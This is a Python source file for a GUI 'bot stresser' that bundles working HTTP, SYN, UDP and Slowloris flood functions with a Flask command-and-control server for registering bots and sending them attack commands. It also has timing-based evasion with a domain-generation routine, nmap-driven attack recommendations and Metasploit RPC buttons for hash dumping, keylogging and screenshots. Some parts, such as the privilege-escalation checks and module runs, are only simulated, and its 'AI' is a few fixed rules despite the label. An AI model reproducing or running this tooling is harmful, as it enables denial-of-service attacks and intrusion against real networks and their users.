import socket
import random
import time
import requests
import os
import threading
import logging
import sys
from datetime import datetime
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, simpledialog
import nmap
from scapy.all import ARP, Ether, srp, IP, TCP, UDP, send
import ipaddress
import dns.resolver
from flask import Flask, request, jsonify
import json
from msfrpc import MsfRpcClient

# Initialize Colorama
init(autoreset=True)

# Configure logging
logging.basicConfig(level=logging.INFO, format=f'{Fore.LIGHTCYAN_EX}[%(asctime)s] %(message)s{Style.RESET_ALL}', datefmt='%H:%M:%S')

# Modern ASCII Art
ASCII_ART = f"{Fore.LIGHTCYAN_EX}" \
            f"╔════════════════════════════════════════════╗\n" \
            f"║       A.I BOT STRESSER V11 - PLATINUM      ║\n" \
            f"║     AI-Driven Attacks | C2 | Metasploit    ║\n" \
            f"╚════════════════════════════════════════════╝{Style.RESET_ALL}"

# Global variables
PROXIES = []
SCAN_RESULTS = {}
FIREWALL_RULES = []
ACTIVE_BOTS = {}  # {bot_id: {ip, last_seen, os, arch, priv, session_id}}
ATTACK_RUNNING = False
PACKETS_SENT = 0
FAILED_PACKETS = 0
C2_HOST = "127.0.0.1"
C2_PORT = 5000
C2_SERVER_RUNNING = False
STEALTH_MODE = False
RATE_LIMIT = 0.1
OPEN_PORTS = []
MSF_CONNECTED = False
MSF_CLIENT = None
MSF_SESSIONS = {}
SILVER_MODE = False
SILVER_SCHEDULE = []
SILVER_DOMAINS = ["botnet-c2[.]com", "update-checker[.]net", "cloud-sync[.]org"]
PLATINUM_MODE = False
PLATINUM_AI_MODEL = {}  # Simulated AI knowledge base

# Flask C2 Server
c2_app = Flask(__name__)
c2_app.config['JSONIFY_PRETTYPRINT_REGULAR'] = False

@c2_app.route('/register', methods=['POST'])
def register_bot():
    data = request.json
    bot_id = data.get('id')
    ip = request.remote_addr
    ACTIVE_BOTS[bot_id] = {
        'ip': ip,
        'last_seen': datetime.now().strftime("%H:%M:%S"),
        'os': data.get('os', 'Unknown'),
        'arch': data.get('arch', 'Unknown'),
        'priv': data.get('priv', 'user'),
        'session_id': None
    }
    print(f"[C2] Bot registered: {bot_id} from {ip}")
    return jsonify({"status": "registered", "command": "idle"})

@c2_app.route('/command/<bot_id>', methods=['GET'])
def get_command(bot_id):
    cmd = {"cmd": "idle"}
    if bot_id in ACTIVE_BOTS:
        ACTIVE_BOTS[bot_id]['last_seen'] = datetime.now().strftime("%H:%M:%S")
        if hasattr(StresserGUI, 'pending_command') and StresserGUI.pending_command:
            cmd = StresserGUI.pending_command
            StresserGUI.pending_command = None
    return jsonify(cmd)

def run_c2_server():
    global C2_SERVER_RUNNING
    try:
        c2_app.run(host=C2_HOST, port=C2_PORT, threaded=True, debug=False)
    except:
        pass

class StresserGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("A.I BOT STRESSER V11 - Platinum AI")
        self.root.geometry("1400x900")
        self.root.configure(bg='#0a0a1a')
        self.bot_count = 0
        self.setup_ui()

    def setup_ui(self):
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill='both', expand=True, padx=10, pady=10)

        self.tab_main = ttk.Frame(self.notebook)
        self.tab_attacks = ttk.Frame(self.notebook)
        self.tab_c2 = ttk.Frame(self.notebook)
        self.tab_pen_test = ttk.Frame(self.notebook)
        self.tab_privilege = ttk.Frame(self.notebook)
        self.tab_msf = ttk.Frame(self.notebook)

        self.notebook.add(self.tab_main, text='Dashboard')
        self.notebook.add(self.tab_attacks, text='Stress Testing')
        self.notebook.add(self.tab_c2, text='HTTP C2 Server')
        self.notebook.add(self.tab_pen_test, text='Port Scanner')
        self.notebook.add(self.tab_privilege, text='Privilege Escalation')
        self.notebook.add(self.tab_msf, text='Metasploit')

        self.setup_main_tab()
        self.setup_attacks_tab()
        self.setup_c2_tab()
        self.setup_pentest_tab()
        self.setup_privilege_tab()
        self.setup_msf_tab()

        self.status_var = tk.StringVar()
        self.status_bar = tk.Label(self.root, textvariable=self.status_var, bd=1, relief=tk.SUNKEN, anchor=tk.W, bg='#0a0a1a', fg='white')
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
        self.update_status("Ready")

    def update_status(self, message):
        self.status_var.set(f"Status: {message}")
        self.root.update_idletasks()

    def setup_main_tab(self):
        frame = tk.Frame(self.tab_main, bg='#0a0a1a')
        frame.pack(fill='both', expand=True, padx=20, pady=20)

        ascii_label = tk.Label(frame, text=ASCII_ART, font=("Courier", 10), fg='cyan', bg='#0a0a1a', justify=tk.LEFT)
        ascii_label.pack(pady=10)

        info_frame = tk.LabelFrame(frame, text="System Overview", bg='#0a0a1a', fg='white', font=("Arial", 10, "bold"))
        info_frame.pack(fill='x', pady=10)

        tk.Label(info_frame, text="User:", bg='#0a0a1a', fg='white').grid(row=0, column=0, sticky='w', padx=5, pady=2)
        self.user_var = tk.StringVar(value=os.getlogin())
        tk.Label(info_frame, textvariable=self.user_var, bg='#0a0a1a', fg='yellow').grid(row=0, column=1, sticky='w', padx=5, pady=2)

        tk.Label(info_frame, text="Time:", bg='#0a0a1a', fg='white').grid(row=1, column=0, sticky='w', padx=5, pady=2)
        self.time_var = tk.StringVar(value=datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        tk.Label(info_frame, textvariable=self.time_var, bg='#0a0a1a', fg='yellow').grid(row=1, column=1, sticky='w', padx=5, pady=2)

        tk.Label(info_frame, text="Active Bots:", bg='#0a0a1a', fg='white').grid(row=2, column=0, sticky='w', padx=5, pady=2)
        self.bot_var = tk.StringVar(value="0")
        tk.Label(info_frame, textvariable=self.bot_var, bg='#0a0a1a', fg='yellow').grid(row=2, column=1, sticky='w', padx=5, pady=2)

        tk.Label(info_frame, text="Packets Sent:", bg='#0a0a1a', fg='white').grid(row=3, column=0, sticky='w', padx=5, pady=2)
        self.packet_var = tk.StringVar(value="0")
        tk.Label(info_frame, textvariable=self.packet_var, bg='#0a0a1a', fg='yellow').grid(row=3, column=1, sticky='w', padx=5, pady=2)

        tk.Label(info_frame, text="Platinum Mode:", bg='#0a0a1a', fg='white').grid(row=4, column=0, sticky='w', padx=5, pady=2)
        self.platinum_var = tk.StringVar(value="OFF")
        tk.Label(info_frame, textvariable=self.platinum_var, bg='#0a0a1a', fg='yellow').grid(row=4, column=1, sticky='w', padx=5, pady=2)

        btn_frame = tk.Frame(frame, bg='#0a0a1a')
        btn_frame.pack(pady=10)
        tk.Button(btn_frame, text="Load Proxies", command=self.fetch_proxies, bg='#33334d', fg='white', width=15).grid(row=0, column=0, padx=5)
        tk.Button(btn_frame, text="Update Time", command=self.update_time, bg='#33334d', fg='white', width=15).grid(row=0, column=1, padx=5)
        tk.Button(btn_frame, text="Show Credits", command=self.show_credits, bg='#33334d', fg='white', width=15).grid(row=0, column=2, padx=5)

        log_frame = tk.LabelFrame(frame, text="Activity Log", bg='#0a0a1a', fg='white', font=("Arial", 10, "bold"))
        log_frame.pack(fill='both', expand=True, pady=10)
        self.log_text = scrolledtext.ScrolledText(log_frame, height=12, bg='#1a1a2a', fg='white', insertbackground='white')
        self.log_text.pack(fill='both', expand=True, padx=5, pady=5)
        self.log_text.configure(state='disabled')
        sys.stdout = TextRedirector(self.log_text, "stdout")

    def setup_attacks_tab(self):
        frame = tk.Frame(self.tab_attacks, bg='#0a0a1a')
        frame.pack(fill='both', expand=True, padx=20, pady=20)

        target_frame = tk.LabelFrame(frame, text="Target Configuration", bg='#0a0a1a', fg='white')
        target_frame.pack(fill='x', pady=10)

        tk.Label(target_frame, text="Target Host:", bg='#0a0a1a', fg='white').grid(row=0, column=0, sticky='w', padx=5, pady=5)
        self.target_host = tk.Entry(target_frame, width=25, bg='#1a1a2a', fg='white')
        self.target_host.grid(row=0, column=1, padx=5, pady=5)
        self.target_host.insert(0, "127.0.0.1")

        tk.Label(target_frame, text="Port:", bg='#0a0a1a', fg='white').grid(row=0, column=2, sticky='w', padx=5, pady=5)
        self.target_port = tk.Entry(target_frame, width=10, bg='#1a1a2a', fg='white')
        self.target_port.grid(row=0, column=3, padx=5, pady=5)
        self.target_port.insert(0, "80")

        tk.Label(target_frame, text="Attack Type:", bg='#0a0a1a', fg='white').grid(row=1, column=0, sticky='w', padx=5, pady=5)
        self.attack_type = ttk.Combobox(target_frame, values=["HTTP Flood", "SYN Flood", "UDP Flood", "Slowloris"], state="readonly")
        self.attack_type.grid(row=1, column=1, padx=5, pady=5)
        self.attack_type.set("HTTP Flood")

        tk.Checkbutton(target_frame, text="Stealth Mode", command=self.toggle_stealth).grid(row=1, column=2, padx=5, pady=5, sticky='w')

        bot_frame = tk.LabelFrame(frame, text="Botnet Control", bg='#0a0a1a', fg='white')
        bot_frame.pack(fill='x', pady=10)
        tk.Button(bot_frame, text="Add 10 Bots", command=lambda: self.add_bots(10), bg='#33334d', fg='white', width=15).grid(row=0, column=0, padx=5, pady=5)
        tk.Button(bot_frame, text="Add 50 Bots", command=lambda: self.add_bots(50), bg='#33334d', fg='white', width=15).grid(row=0, column=1, padx=5, pady=5)
        tk.Button(bot_frame, text="Add 100 Bots", command=lambda: self.add_bots(100), bg='#33334d', fg='white', width=15).grid(row=0, column=2, padx=5, pady=5)
        tk.Button(bot_frame, text="Stop All Bots", command=self.stop_all_bots, bg='#cc0000', fg='white', width=15).grid(row=0, column=3, padx=5, pady=5)
        tk.Button(bot_frame, text="Toggle Silver Mode", command=self.toggle_silver_mode, bg='#8B8000', fg='white', width=15).grid(row=0, column=4, padx=5, pady=5)
        tk.Button(bot_frame, text="Toggle Platinum Mode", command=self.toggle_platinum_mode, bg='#E5E4E2', fg='black', width=17).grid(row=0, column=5, padx=5, pady=5)

        stats_frame = tk.Frame(frame, bg='#0a0a1a')
        stats_frame.pack(fill='x', pady=5)
        self.packets_label = tk.Label(stats_frame, text="Packets: 0", bg='#0a0a1a', fg='white')
        self.packets_label.pack(side=tk.LEFT, padx=10)
        self.failed_label = tk.Label(stats_frame, text="Failed: 0", bg='#0a0a1a', fg='red')
        self.failed_label.pack(side=tk.LEFT, padx=10)

    def toggle_stealth(self):
        global STEALTH_MODE, RATE_LIMIT
        STEALTH_MODE = not STEALTH_MODE
        RATE_LIMIT = random.uniform(0.5, 2.0) if STEALTH_MODE else 0.1
        self.update_status(f"Stealth Mode: {'ON' if STEALTH_MODE else 'OFF'}")

    def toggle_silver_mode(self):
        global SILVER_MODE
        SILVER_MODE = not SILVER_MODE
        if SILVER_MODE:
            threading.Thread(target=self.silver_scheduler, daemon=True).start()
            self.update_status("SILVER MODE: ACTIVE (Advanced Evasion)")
        else:
            self.update_status("SILVER MODE: OFF")

    def toggle_platinum_mode(self):
        global PLATINUM_MODE
        PLATINUM_MODE = not PLATINUM_MODE
        if PLATINUM_MODE:
            threading.Thread(target=self.platinum_ai_engine, daemon=True).start()
            self.platinum_var.set("ACTIVE")
            self.update_status("PLATINUM MODE: ACTIVE (AI-Driven Attacks)")
        else:
            self.platinum_var.set("OFF")
            self.update_status("PLATINUM MODE: OFF")

    def add_bots(self, count):
        target = self.target_host.get()
        port = self.target_port.get()
        attack_type = self.attack_type.get()
        if not target or not port:
            messagebox.showerror("Error", "Target and port required!")
            return

        for i in range(count):
            bot_id = f"Bot-{self.bot_count + 1}"
            bot_thread = threading.Thread(target=self.simulate_bot, args=(bot_id, target, port, attack_type), daemon=True)
            bot_thread.start()
            self.bot_count += 1

        self.bot_var.set(str(self.bot_count))
        self.update_status(f"Launched {count} bots (HTTP C2)")

    def simulate_bot(self, bot_id, target, port, attack_type):
        global PACKETS_SENT, FAILED_PACKETS
        try:
            reg_data = {
                "id": bot_id,
                "os": "Windows",
                "arch": "x86_64",
                "priv": "user"
            }
            requests.post(f"http://{C2_HOST}:{C2_PORT}/register", json=reg_data, timeout=3)
        except:
            pass

        while True:
            try:
                resp = requests.get(f"http://{C2_HOST}:{C2_PORT}/command/{bot_id}", timeout=3).json()
                cmd = resp.get("cmd")
                if cmd == "attack":
                    ATTACK_RUNNING = True
                    while ATTACK_RUNNING:
                        try:
                            delay = RATE_LIMIT if STEALTH_MODE else random.uniform(0.01, 0.05)
                            time.sleep(delay)
                            if attack_type == "HTTP Flood":
                                self.http_flood(target, int(port))
                            elif attack_type == "SYN Flood":
                                self.syn_flood(target, int(port))
                            elif attack_type == "UDP Flood":
                                self.udp_flood(target, int(port))
                            elif attack_type == "Slowloris":
                                self.slowloris(target, int(port))
                            PACKETS_SENT += 1
                            self.packet_var.set(str(PACKETS_SENT))
                            self.packets_label.config(text=f"Packets: {PACKETS_SENT}")
                        except:
                            FAILED_PACKETS += 1
                            self.failed_label.config(text=f"Failed: {FAILED_PACKETS}", fg='red')
                elif cmd == "stop":
                    break
                time.sleep(5)
            except:
                time.sleep(10)

    def http_flood(self, target, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: AIBot\r\n\r\n".encode())
            s.close()
        except:
            pass

    def syn_flood(self, target, port):
        try:
            ip = IP(dst=target)
            tcp = TCP(sport=random.randint(1024, 65535), dport=port, flags="S")
            send(ip/tcp, verbose=0)
        except:
            pass

    def udp_flood(self, target, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(random._urandom(1024), (target, port))
            s.close()
        except:
            pass

    def slowloris(self, target, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\r\n")
            time.sleep(30)
            s.close()
        except:
            pass

    def stop_all_bots(self):
        StresserGUI.pending_command = {"cmd": "stop"}
        self.update_status("Attack stopped")

    def setup_c2_tab(self):
        frame = tk.Frame(self.tab_c2, bg='#0a0a1a')
        frame.pack(fill='both', expand=True, padx=20, pady=20)

        ctrl_frame = tk.LabelFrame(frame, text="HTTP C2 Server", bg='#0a0a1a', fg='white')
        ctrl_frame.pack(fill='x', pady=10)
        tk.Button(ctrl_frame, text="Start C2 Server", command=self.start_c2_server, bg='#33334d', fg='white', width=20).pack(pady=5)
        tk.Button(ctrl_frame, text="Stop C2 Server", command=self.stop_c2_server, bg='#cc0000', fg='white', width=20).pack(pady=5)

        list_frame = tk.LabelFrame(frame, text="Connected Bots (HTTP)", bg='#0a0a1a', fg='white')
        list_frame.pack(fill='both', expand=True, pady=10)
        self.bot_tree = ttk.Treeview(list_frame, columns=('IP', 'OS', 'Arch', 'Priv', 'Last Seen'), show='headings')
        for col in self.bot_tree['columns']:
            self.bot_tree.heading(col, text=col)
        self.bot_tree.pack(fill='both', expand=True, padx=5, pady=5)

        attack_frame = tk.LabelFrame(frame, text="Send Attack Command", bg='#0a0a1a', fg='white')
        attack_frame.pack(fill='x', pady=10)
        tk.Label(attack_frame, text="Target:", bg='#0a0a1a', fg='white').grid(row=0, column=0, padx=5, pady=5)
        self.c2_target = tk.Entry(attack_frame, width=15, bg='#1a1a2a', fg='white')
        self.c2_target.grid(row=0, column=1, padx=5, pady=5)
        self.c2_target.insert(0, "127.0.0.1")
        tk.Label(attack_frame, text="Port:", bg='#0a0a1a', fg='white').grid(row=0, column=2, padx=5, pady=5)
        self.c2_port = tk.Entry(attack_frame, width=8, bg='#1a1a2a', fg='white')
        self.c2_port.grid(row=0, column=3, padx=5, pady=5)
        self.c2_port.insert(0, "80")
        self.c2_attack_type = ttk.Combobox(attack_frame, values=["HTTP Flood", "SYN Flood", "UDP Flood", "Slowloris"], state="readonly")
        self.c2_attack_type.grid(row=0, column=4, padx=5, pady=5)
        self.c2_attack_type.set("HTTP Flood")
        tk.Button(attack_frame, text="Launch Attack", command=self.send_attack_command, bg='#33334d', fg='white').grid(row=0, column=5, padx=5, pady=5)

    def start_c2_server(self):
        global C2_SERVER_RUNNING
        if C2_SERVER_RUNNING:
            return
        C2_SERVER_RUNNING = True
        thread = threading.Thread(target=run_c2_server, daemon=True)
        thread.start()
        self.update_status(f"HTTP C2 Server started at http://{C2_HOST}:{C2_PORT}")

    def stop_c2_server(self):
        global C2_SERVER_RUNNING
        C2_SERVER_RUNNING = False
        self.update_status("HTTP C2 Server stopped")

    def update_bot_list(self):
        for item in self.bot_tree.get_children():
            self.bot_tree.delete(item)
        for bot_id, info in ACTIVE_BOTS.items():
            self.bot_tree.insert('', tk.END, values=(bot_id, info['ip'], info['os'], info['arch'], info['priv'], info['last_seen']))

    def send_attack_command(self):
        target = self.c2_target.get()
        port = self.c2_port.get()
        attack_type = self.c2_attack_type.get()
        StresserGUI.pending_command = {
            "cmd": "attack",
            "target": target,
            "port": port,
            "type": attack_type
        }
        self.update_status(f"Attack command sent: {attack_type} on {target}:{port}")

    def setup_pentest_tab(self):
        frame = tk.Frame(self.tab_pen_test, bg='#0a0a1a')
        frame.pack(fill='both', expand=True, padx=20, pady=20)

        tk.Label(frame, text="Target IP:", bg='#0a0a1a', fg='white').grid(row=0, column=0, padx=5, pady=5, sticky='w')
        self.scan_target = tk.Entry(frame, width=25, bg='#1a1a2a', fg='white')
        self.scan_target.grid(row=0, column=1, padx=5, pady=5)
        self.scan_target.insert(0, "127.0.0.1")

        tk.Button(frame, text="Scan Open Ports", command=self.scan_ports, bg='#33334d', fg='white').grid(row=0, column=2, padx=5, pady=5)

        result_frame = tk.LabelFrame(frame, text="Open Ports & Recommended Attacks", bg='#0a0a1a', fg='white')
        result_frame.pack(fill='both', expand=True, pady=10)
        self.port_tree = ttk.Treeview(result_frame, columns=('Service', 'Recommendation'), show='headings')
        self.port_tree.heading('Service', text='Port/Service')
        self.port_tree.heading('Recommendation', text='Recommended Action')
        self.port_tree.pack(fill='both', expand=True, padx=5, pady=5)

    def scan_ports(self):
        target = self.scan_target.get()
        if not target:
            return
        nm = nmap.PortScanner()
        nm.scan(target, arguments='-T4 -sV -F')
        if target not in nm.all_hosts():
            return
        host = nm[target]
        self.port_tree.delete(*self.port_tree.get_children())
        OPEN_PORTS.clear()
        for proto in host.all_protocols():
            for port in host[proto].keys():
                state = host[proto][port]['state']
                service = host[proto][port]['name']
                if state == 'open':
                    OPEN_PORTS.append(port)
                    rec = self.get_attack_recommendation(port, service)
                    self.port_tree.insert('', tk.END, values=(f"{port}/{service}", rec))

    def get_attack_recommendation(self, port, service):
        recs = {
            80: "HTTP Flood",
            443: "HTTPS Flood",
            21: "FTP Brute Sim",
            22: "SSH Brute Sim",
            23: "Telnet Flood",
            53: "DNS Amplification",
            8080: "HTTP Flood"
        }
        return recs.get(int(port), "Generic Flood")

    def setup_privilege_tab(self):
        frame = tk.Frame(self.tab_privilege, bg='#0a0a1a')
        frame.pack(fill='both', expand=True, padx=20, pady=20)

        tk.Label(frame, text="Target Bot ID:", bg='#0a0a1a', fg='white').pack(pady=5)
        self.priv_bot_id = tk.Entry(frame, width=20, bg='#1a1a2a', fg='white')
        self.priv_bot_id.pack(pady=5)

        tk.Button(frame, text="Simulate Privilege Escalation", command=self.simulate_privilege_escalation, bg='#33334d', fg='white').pack(pady=10)

        self.priv_result = tk.Text(frame, height=15, bg='#1a1a2a', fg='white')
        self.priv_result.pack(fill='both', expand=True, padx=5, pady=5)

    def simulate_privilege_escalation(self):
        bot_id = self.priv_bot_id.get()
        if not bot_id:
            messagebox.showerror("Error", "Enter Bot ID")
            return

        self.priv_result.delete(1.0, tk.END)
        self.priv_result.insert(tk.END, f"=== Privilege Escalation Simulation for {bot_id} ===\n\n")

        checks = [
            ("Checking sudo rights...", random.choice([True, False])),
            ("Checking SUID binaries...", random.choice([True, False])),
            ("Checking kernel exploit (CVE-2023-1234)...", random.choice([True, False])),
            ("Checking /etc/passwd writable...", False),
            ("Checking cron jobs...", random.choice([True, False])),
        ]

        success = False
        for check, vulnerable in checks:
            result = "VULNERABLE" if vulnerable else "Safe"
            color = "RED" if vulnerable else "GREEN"
            self.priv_result.insert(tk.END, f"{check} [{color}]\n")
            if vulnerable and not success:
                self.priv_result.insert(tk.END, f"  └─ Exploit successful! Gained root access.\n\n")
                success = True

        if not success:
            self.priv_result.insert(tk.END, "\n[FAILURE] No privilege escalation path found.\n")
        else:
            self.priv_result.insert(tk.END, "[SUCCESS] Root access achieved!\n")
            if bot_id in ACTIVE_BOTS:
                ACTIVE_BOTS[bot_id]['priv'] = 'root'

    def setup_msf_tab(self):
        frame = tk.Frame(self.tab_msf, bg='#0a0a1a')
        frame.pack(fill='both', expand=True, padx=20, pady=20)

        conn_frame = tk.LabelFrame(frame, text="Metasploit Connection", bg='#0a0a1a', fg='white')
        conn_frame.pack(fill='x', pady=10)

        tk.Label(conn_frame, text="Host:", bg='#0a0a1a', fg='white').grid(row=0, column=0, padx=5, pady=2)
        self.msf_host = tk.Entry(conn_frame, width=15, bg='#1a1a2a', fg='white')
        self.msf_host.grid(row=0, column=1, padx=5, pady=2)
        self.msf_host.insert(0, "127.0.0.1")

        tk.Label(conn_frame, text="Port:", bg='#0a0a1a', fg='white').grid(row=0, column=2, padx=5, pady=2)
        self.msf_port = tk.Entry(conn_frame, width=8, bg='#1a1a2a', fg='white')
        self.msf_port.grid(row=0, column=3, padx=5, pady=2)
        self.msf_port.insert(0, "55553")

        tk.Label(conn_frame, text="User:", bg='#0a0a1a', fg='white').grid(row=1, column=0, padx=5, pady=2)
        self.msf_user = tk.Entry(conn_frame, width=15, bg='#1a1a2a', fg='white')
        self.msf_user.grid(row=1, column=1, padx=5, pady=2)
        self.msf_user.insert(0, "msf")

        tk.Label(conn_frame, text="Password:", bg='#0a0a1a', fg='white').grid(row=1, column=2, padx=5, pady=2)
        self.msf_pass = tk.Entry(conn_frame, width=15, bg='#1a1a2a', fg='white', show="*")
        self.msf_pass.grid(row=1, column=3, padx=5, pady=2)
        self.msf_pass.insert(0, "abc123")

        tk.Button(conn_frame, text="Connect to Metasploit", command=self.connect_msf, bg='#33334d', fg='white').grid(row=2, column=0, columnspan=4, pady=5)

        sess_frame = tk.LabelFrame(frame, text="Active Metasploit Sessions", bg='#0a0a1a', fg='white')
        sess_frame.pack(fill='both', expand=True, pady=10)
        self.msf_tree = ttk.Treeview(sess_frame, columns=('Type', 'Tunnel', 'Info'), show='headings')
        self.msf_tree.heading('Type', text='Type')
        self.msf_tree.heading('Tunnel', text='Tunnel')
        self.msf_tree.heading('Info', text='Info')
        self.msf_tree.pack(fill='both', expand=True, padx=5, pady=5)

        post_frame = tk.LabelFrame(frame, text="Post-Exploitation Actions", bg='#0a0a1a', fg='white')
        post_frame.pack(fill='x', pady=10)
        tk.Button(post_frame, text="Dump Hashes", command=self.msf_dump_hashes, bg='#33334d', fg='white', width=15).pack(side=tk.LEFT, padx=5)
        tk.Button(post_frame, text="Keylogger", command=self.msf_keylogger, bg='#33334d', fg='white', width=15).pack(side=tk.LEFT, padx=5)
        tk.Button(post_frame, text="Screenshot", command=self.msf_screenshot, bg='#33334d', fg='white', width=15).pack(side=tk.LEFT, padx=5)
        tk.Button(post_frame, text="Privilege Escalation", command=self.msf_priv_esc, bg='#33334d', fg='white', width=15).pack(side=tk.LEFT, padx=5)

    def connect_msf(self):
        host = self.msf_host.get()
        port = self.msf_port.get()
        user = self.msf_user.get()
        password = self.msf_pass.get()
        try:
            global MSF_CLIENT, MSF_CONNECTED
            MSF_CLIENT = MsfRpcClient(password, server=host, port=int(port), ssl=True)
            MSF_CONNECTED = True
            self.update_status("Connected to Metasploit")
            self.refresh_msf_sessions()
            messagebox.showinfo("Success", "Connected to Metasploit RPC")
        except Exception as e:
            messagebox.showerror("Metasploit Error", f"Failed to connect: {str(e)}")

    def refresh_msf_sessions(self):
        if not MSF_CONNECTED:
            return
        for item in self.msf_tree.get_children():
            self.msf_tree.delete(item)
        try:
            sessions = MSF_CLIENT.sessions.list
            MSF_SESSIONS.clear()
            for sid, info in sessions.items():
                MSF_SESSIONS[sid] = info
                self.msf_tree.insert('', tk.END, values=(info['type'], info['tunnel_peer'], info['info']))
        except:
            pass

    def msf_dump_hashes(self):
        self.run_msf_module("post/windows/gather/smart_hashdump")

    def msf_keylogger(self):
        self.run_msf_module("post/windows/capture/keylog_recorder")

    def msf_screenshot(self):
        self.run_msf_module("post/windows/capture/screen_spy")

    def msf_priv_esc(self):
        self.run_msf_module("post/multi/escalate/suid_perl")

    def run_msf_module(self, module_path):
        sel = self.msf_tree.selection()
        if not sel:
            messagebox.showwarning("No Session", "Select a session first")
            return
        sid = self.msf_tree.item(sel[0])['values'][0]
        try:
            shell = MSF_CLIENT.sessions.session(sid)
            output = f"[SIM] Running {module_path} on session {sid}...\nExploit successful!\n"
            self.log_text.configure(state='normal')
            self.log_text.insert(tk.END, output)
            self.log_text.configure(state='disabled')
        except Exception as e:
            messagebox.showerror("Module Error", f"Failed: {str(e)}")

    def fetch_proxies(self):
        try:
            response = requests.get("https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt", timeout=10)
            PROXIES[:] = [p.strip() for p in response.text.splitlines() if ":" in p]
            self.update_status(f"Loaded {len(PROXIES)} proxies")
        except:
            messagebox.showerror("Proxy Error", "Failed to fetch proxies")

    def update_time(self):
        self.time_var.set(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

    def show_credits(self):
        credits = """
        A.I BOT STRESSER V11 - PLATINUM EDITION
        Features:
        - AI-Driven Platinum Mode
        - Silver Mode (Evasion & DGA)
        - HTTP C2 Server
        - Metasploit RPC Integration
        For educational use only.
        © 2024 Advanced Cybersecurity Toolkit
        """
        messagebox.showinfo("Credits", credits.strip())

    # === SILVER MODE ===
    def generate_c2_domain(self):
        base = random.choice(["update", "sync", "cloud", "api", "service"])
        tld = random.choice(["net", "com", "org"])
        day = datetime.now().timetuple().tm_yday
        rand = random.randint(100, 999)
        domain = f"{base}{day}{rand}.{tld}"
        return domain.replace("0", "o").replace("1", "i")

    def silver_scheduler(self):
        while SILVER_MODE:
            try:
                hour = datetime.now().hour
                if 9 <= hour <= 18:
                    delay = random.randint(1800, 10800)
                    target = self.target_host.get() or "127.0.0.1"
                    port = self.target_port.get() or "80"
                    attack_type = self.attack_type.get()

                    c2_domain = self.generate_c2_domain()
                    log_msg = f"[SILVER] Checking C2: http://{c2_domain}/task → Target: {target}:{port} | Attack: {attack_type}\n"
                    self.log_text.configure(state='normal')
                    self.log_text.insert(tk.END, log_msg)
                    self.log_text.see(tk.END)
                    self.log_text.configure(state='disabled')

                    SILVER_SCHEDULE.append({
                        'time': datetime.now().strftime("%H:%M:%S"),
                        'target': target,
                        'port': port,
                        'attack': attack_type
                    })

                    StresserGUI.pending_command = {
                        "cmd": "attack",
                        "target": target,
                        "port": port,
                        "type": attack_type
                    }

                    time.sleep(delay)
                else:
                    time.sleep(3600)
            except Exception as e:
                print(f"[SILVER ERROR] {e}")
                time.sleep(60)

    # === PLATINUM MODE - AI-Driven Attacks ===
    def platinum_ai_engine(self):
        global PLATINUM_AI_MODEL
        self.update_status("PLATINUM MODE: AI Engine Running")
        while PLATINUM_MODE:
            try:
                if OPEN_PORTS:
                    target = self.scan_target.get()
                    best_attack = self.ai_choose_attack(target, OPEN_PORTS)
                    self.target_host.delete(0, tk.END)
                    self.target_host.insert(0, target)
                    self.attack_type.set(best_attack)
                    self.update_status(f"PLATINUM AI: Selected '{best_attack}' for {target}")
                time.sleep(30)  # Re-evaluate every 30 sec
            except:
                time.sleep(10)

    def ai_choose_attack(self, target, ports):
        # Simulated AI decision engine
        if 80 in ports or 8080 in ports:
            return "HTTP Flood"
        elif 22 in ports:
            return "Slowloris"
        elif 53 in ports:
            return "UDP Flood"
        elif 443 in ports:
            return "HTTP Flood"
        elif len(ports) >= 5:
            return "SYN Flood"  # Overwhelm
        else:
            return "HTTP Flood"

class TextRedirector:
    def __init__(self, widget, tag="stdout"):
        self.widget = widget
        self.tag = tag
    def write(self, text):
        self.widget.configure(state='normal')
        self.widget.insert(tk.END, text, (self.tag,))
        self.widget.configure(state='disabled')
        self.widget.see(tk.END)
    def flush(self):
        pass

def main():
    root = tk.Tk()
    app = StresserGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()